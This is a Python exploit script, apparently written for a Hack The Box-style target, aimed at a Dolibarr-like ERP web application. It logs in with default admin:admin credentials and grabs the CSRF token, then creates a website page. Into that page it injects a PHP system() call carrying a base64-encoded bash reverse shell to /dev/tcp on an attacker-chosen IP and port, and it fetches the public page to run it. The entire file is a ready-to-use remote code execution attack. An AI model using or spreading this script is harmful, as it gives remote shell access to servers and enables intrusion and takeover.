import requests
import base64
from bs4 import BeautifulSoup
from datetime import datetime
import uuid

def session_setup(url):
    global headers
    headers = {
        'Host': url.split('/')[-1],
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip, deflate',
        'Origin': url
    }

def get_csrf_token(url):
    try:
        global session,headers
        r = session.get(url,headers=headers)
        soup = BeautifulSoup(r.text,'html.parser')
        csrf = soup.find('meta', attrs={'name': 'anti-csrf-newtoken'})
        if csrf:
            print('[+] Extracted CSRF Token')
            global token
            token = csrf.get('content')
            return csrf.get('content')
        else:
            print('[-] Not able to extract the csrf token')
            exit(1)
    except Exception as e:
        print(f'[-] Error occured: {e}')

def login(url,user,passwd):
    global session, headers
    try:
        login_url = f'{url}/admin/index.php'
        token = get_csrf_token(url)
        data = {
            'token': token,
            'actionlogin': 'login',
            'loginfunction': 'loginfunction',
            'backtopage': '',
            'tz': '5.5',
            'tz_string': 'Asia/Kolkata',
            'dst_observed': '0',
            'dst_first': '',
            'dst_second': '',
            'screenwidth': '1920',
            'screenheight': '929',
            'dol_hide_topmenu': '',
            'dol_hide_leftmenu': '',
            'dol_optimize_smallscreen': '',
            'dol_no_mouse_hover': '',
            'dol_use_jmobile': '',
            'username': user,
            'password': passwd
        }
        # print(headers)
        r = session.post(url,data=data,headers=headers)
        if r.status_code == 200:
            if "My Dashboard" in r.text:
                print('[+] Logged In successfully')
                return True
            else:
                print('[-] Login Failed')
                return False
        else:
            print(f'[-] Status code for login request:{r.status_code}')
            return False
    except Exception as e:
        print(f'[-] Error occured: {e}')

def create_website(url):
    global session, token, website_name
    create_website_url = f'{url}/website/index.php'
    session.headers.update({
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary0TYAB8bzZ1DiVwez"
    })
    
    try:
        data = {
            "token": token,
            "backtopage": '',
            "dol_openinpopup": '',
            "action": 'addsite',
            "website": '-1',
            "WEBSITE_REF": website_name,
            "WEBSITE_LANG": 'en',
            "WEBSITE_OTHERLANG": '',
            "WEBSITE_DESCRIPTION": '',
            "virtualhost": '',
            "addcontainer": 'create'
        }
        r = session.post(url=create_website_url,data=data,headers=headers)
        if r.status_code == 200:
            if website_name in r.text:
                print('[+] Website created successfully')
                return True
            else:
                print('[-] Error in website creation')
                return False
        else:
            print(f'[-] Status code for website creation request:{r.status_code}')
            return False
    except Exception as e:
        print(f'[-] Error occured: {e}')
    
def create_page(url):
    global session, token , headers, website_name
    page_creation = f'{url}/website/index.php'
    session.headers.update({
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryNy4GtqU6jty4Aoi4"
    })
    current_time = datetime.now()
    date_creation = current_time.strftime("%m/%d/%Y %H:%M:%S")
    try: 
        data = {
            "token": token,
            "backtopage": "",
            "dol_openinpopup": "",
            "action": "addcontainer",
            "website": website_name,
            "pageidbis": "-1",
            "pageid": "1",
            "radiocreatefrom": "checkboxcreatemanually",
            "WEBSITE_TYPE_CONTAINER": "page",
            "sample": "empty",
            "WEBSITE_TITLE": "test",
            "WEBSITE_PAGENAME": "test",
            "WEBSITE_LANG": "en",
            "datecreation": date_creation,
            "datecreationday": current_time.day,
            "datecreationmonth": current_time.month,
            "datecreationyear": current_time.year,
            "datecreationhour": current_time.hour,
            "datecreationmin": current_time.minute,
            "datecreationsec": current_time.second,
            "addcontainer": "Create",
            "externalurl": "",
            "grabimages": "1",
            "grabimagesinto": "root"
        }
        r = session.post(page_creation,data=data,headers=headers)
        if r.status_code == 200:
            if website_name in r.text:
                print('[+] Page created successfully')
                return True
            else:
                print('[-] Error in page creation')
                return False
        else:
            print(f'[-] Status code for page creation request:{r.status_code}')
            return False
    except Exception as e:
        print(f'[-] Error occured: {e}')

def get_revshell(url,ip,port):
    global session, headers, token, website_name
    rev_shell = f'bash >& /dev/tcp/{ip}/{port} 0>&1'
    encoded_rev_shell = base64.b64encode(rev_shell.encode())
    rev_payload = f'echo {encoded_rev_shell.decode()} | base64 -d | bash'
    page_content=f'''
    <section id="mysection1" contenteditable="true">
    <?PHP system("{rev_payload}"); ?>
    </section>
    '''
    page_id_url = f'{url}/website/index.php?website={website_name}'
    payload_send_url = f'{url}/website/index.php'
    try:
        r = session.get(page_id_url)
        soup = BeautifulSoup(r.text,'html.parser')
        anchor_tag = soup.find_all('a', class_='valignmiddle')
        for anchor in anchor_tag:
            href = anchor.get('href')
            if website_name in href:
                pageid = href.split('&')[1].split('=')[-1]
                break
        page_url = f'{url}/website/index.php?website={website_name}&pageid={pageid}&action=editsource&token={token}'
        data = {
            "token": token,
            "backtopage": "",
            "dol_openinpopup": "",
            "action": "updatesource",
            "website": "test",
            "pageid": pageid,
            "update": "Save",
            "PAGE_CONTENT_x": "8",
            "PAGE_CONTENT_y": "2",
            "PAGE_CONTENT": page_content
        }
        r = session.post(page_id_url,data=data,headers=headers)
        if r.status_code == 302 or 200:
            print('[+] Payload uploaded')
        else:
            print(f'[-] Status code for payload post request:{r.status_code}')

        payload_execution_url = f'{url}/public/website/index.php?website={website_name}&pageid={pageid}'
        print('[+] Payload Execution Url:',payload_execution_url)
        print('[+] Check your listner')
        r = session.get(payload_execution_url)
        print('[+] Payload Executed')
    except Exception as e:
        print(f'[-] Error occured: {e}')

if __name__ == '__main__':
    session = requests.session()
    headers = {}
    token = ''
    website_name = str(uuid.uuid4()).replace('-','')
    domain = input('Enter the domain name (eg: app.hackthebox.com)\n>>>')
    url = f'http://{domain}'
    ip = input('Enter the ip address for reverse shell\n>>>')
    port = int(input('Enter port number for reverse shell\n>>>'))
    print('[+] Username password used admin:admin')
    user = 'admin'
    passwd = 'admin'
    session_setup(url)
    login(url,user,passwd)
    create_website(url)
    create_page(url)
    get_revshell(url,ip,port)
